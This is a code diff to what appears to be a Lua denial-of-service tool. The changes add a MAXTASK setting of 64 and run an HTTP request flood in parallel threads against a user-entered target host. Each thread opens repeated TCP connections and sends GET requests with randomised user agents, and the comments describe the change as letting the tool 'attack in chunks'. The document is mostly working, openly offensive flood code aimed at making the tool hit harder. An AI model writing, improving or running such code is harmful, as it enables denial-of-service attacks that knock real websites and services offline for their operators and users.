@@ -22,7 +22,8 @@ m.ESC = "Hexadecimal" -- [ note: On different OS have their own ANSI Escape can 
 m.tdosportdefault = "https" -- [note: http, https]
 m.useproxies = false -- skip proxies txt to lua convert if false
 m.uselanes = false -- multithread note: this clogs up thread so fast
-            
+m.MAXTASK = 64 --attack in chunks fix thread clog up
+             
 return m
 ]] -- og from config.lua
 
@@ -85,7 +86,7 @@ local prettytext = require("prettytext")
 local socket = require('socket')
 local useragent = require("useragent")
 local lanes = require("lanes").configure()
-
+local activelanes = {}
 local branding = [[
                    _                                     
           ' )   _/                               
@@ -109,6 +110,7 @@ local function exit() -- exit and clean up
     colord:erasesavedL()
     colord:eraseall()
     io.write(colord:cursorvis())
+    collectgarbage("collect")
     os.exit()
 end
 
@@ -121,7 +123,6 @@ local function tdos()
     colord:reset()
     colord:erasesavedL()
     colord:eraseall()
-    io.write(colord:cursorinvis())
     io.write("Target : ")
     local inputhost = io.read()
     if config.tdosportdefault == "https" then
@@ -148,16 +149,26 @@ local function tdos()
             if config.useproxies then
                 print("proxies")
             else
-                lanes.gen("*", function()
-                    local socket = require("socket")
-                    local useragent = require("useragent")
-                    for i = 1, 10 do
-                        local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
-                        tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
-                        tcp:close()
-                        io.write("send ".. inputhost.."\n")
-                    end
-                end)()
+                for i = 1, config.MAXTASK do --allocate stuff
+                    activelanes[i] = lanes.gen("*", function()
+                                        local socket = require("socket")
+                                        local useragent = require("useragent")
+                                        for i = 1, 10 do
+                                            local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
+                                            tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
+                                            tcp:close()
+                                            io.write("send ".. inputhost.."\n")
+                                        end
+                                    end)() -- this run
+                end
+                for i = 1, #activelanes do  --free
+                    local sellanes = activelanes[i]
+                    sellanes:cancel()
+                    sellanes:join()
+                    activelanes[i] = nil
+                    io.write("send "..#activelanes.."\n")
+                end
+                collectgarbage("collect")
             end
         end
         else
@@ -206,7 +217,6 @@ local function tui()
         colord:reset()
         colord:erasesavedL()
         colord:eraseall()
-        io.write(colord:cursorinvis())
         io.write(colord:b256setcolor(211,"fg")..branding..colord:reset())
         io.flush()
         io.write("Tools:\n")
